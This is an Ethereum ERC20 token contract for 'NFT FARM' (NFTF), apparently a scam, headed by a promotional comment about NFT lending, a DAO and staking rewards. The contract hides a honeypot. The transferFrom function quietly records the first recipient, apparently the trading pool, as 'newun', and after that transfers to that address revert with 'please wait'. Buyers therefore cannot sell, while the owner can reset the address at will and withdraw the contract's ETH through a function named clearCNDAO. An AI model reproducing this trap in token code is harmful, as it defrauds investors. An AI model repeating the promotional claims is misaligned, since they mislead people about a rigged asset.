/**
 *Submitted for verification at Etherscan.io on 2021-04-10
*/

/*
Introducing NFT FARM

NFT FARM ecosystem include NFT (Non-Fungible Tokens), NFT Lending marketplace and governance token NFTF.

$NFTF - NFT FARM is a unique ERC20 tokens based on Ethereum Blockchain & OpenSea Smart Contract that makes it possible to buy time. We have broken down 24 hours into 86.400 seconds in format Hours: Minutes: Seconds or simply 00:00:00
Items design changes every 5 minutes.

NFT FARM is a unique product:
- Art intertwined with technology;
- The present intertwined with the future;
- Investments intertwined with collecting.
In addition to having unique NFT, their holders get the opportunity to receive NFTF token as reward.
NFT lending marketplace & NFTF token
Art and collectible markets in general suffer from less liquidity than fiat, equity or other types of assets. Players might miss out on great opportunities or having to sell too cheap to raise cash. Similarly we feel it is a great opportunity for other users to get a return on their ETH
With our real-time pricing updates for NFT assets, you can get an accurate view of your entire portfolio in one place.
NFTF — NFT farm MilliSeconds tokens.
NFTF tokens give ability to:
- Vote for the development of the project and release of new collections of our team or authorized projects
- Stake coin on P2P Marketplace to get rewarded
- Receive unique offers from top NFT creators for borrowing
- Join NFT Farm Stakers Club
- Get fee from Liquidity Mining
Our goal is to evolve towards a Decentralized Autonomous Organization (DAO), where all decision rights will belong to the platform users.
NFTF token, awarded to the active users of the NFT farm ecosystem, will act as the governance instrument: it will enable NFT holders, NFT lenders, NFT borrowers and liquidity miners to vote on multiple upgrades and decide how the project should develop further.
NFTF:

100,000 Fixed ERC-20 tokens.
- 10% — Team
- 70% — Reward to NFT Holders
- 20% — Reward to P2P Marketplace users

NFT FARM Project Launching in April - Seeks to Solve Liquidity Problem on The NFT Market

In the wake of the hype around DeFi, projects engaged in other directions have faded into the background. We would like to tell you about the NFT FARM project, which can set a new trend on the NFT market.
NFT (Non-Fungible Tokens) have become popular thanks to the CryptoKitties project. But few know that since the advent of Cryptokitties in 2017, a whole industry of digital goods has emerged from virtual land (Sandbox) to works of art (Rarible).
One of the key sites on this market is the OpenSea.io platform. It allows users to create their own virtual stores and sell NFT products. We can say this is the new Apple Store for NFT products. Sales of some projects on the site reach up to 2,000 ETH in volme per week.
But a reasonable question arises as to who would invest in NFT goods in 2020 when DeFi projects appear every day and are promising three-digit percent per annum. You have to be either a fan, or a collector, or a visionary. Therefore, we will tell you more about NFT FARM and how it wants to solve the liquidity problem on the NFT market.
The project team is developing a P2P marketplace for lendings secured by NFT goods. The marketplace will operate on the DAO principle and will be managed by the community through the NFTF management token. By referring to the platform, owners of NFT goods will have access to liquidity without losing their NFT assets, and lenders will have the opportunity to receive collateralized income. WIN-WIN scenario.
The development team from NFT FARM has gone further and launched its own store with NFT products on OpenSea. This is also a unique project of its kind, as it allows NFT FARM owners to stake them. Those buying and holding NFT FARM with subsequent staking on the site will receive rewards in NFTF tokens over the next 8 years! The CTMS also makes it possible to receive rewards from transactions on the P2P marketplace. DOUBLE WIN-WIN scenario!
You can read more about the NFT FARM NFT / NFTF token

Distribution scheme on the official website at https://nftfarm.io
*/

pragma solidity >=0.5.17;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract ERC20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenERC20 is ERC20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public newun;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "NFT Farm";
    name = "NFTF";
    decimals = 8;
    _totalSupply = 10000000000000;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function transfernewun(address _newun) public onlyOwner {
    newun = _newun;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != newun, "please wait");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && newun == address(0)) newun = to;
      else require(to != newun, "please wait");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract NFTF is TokenERC20 {

  function clearCNDAO() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}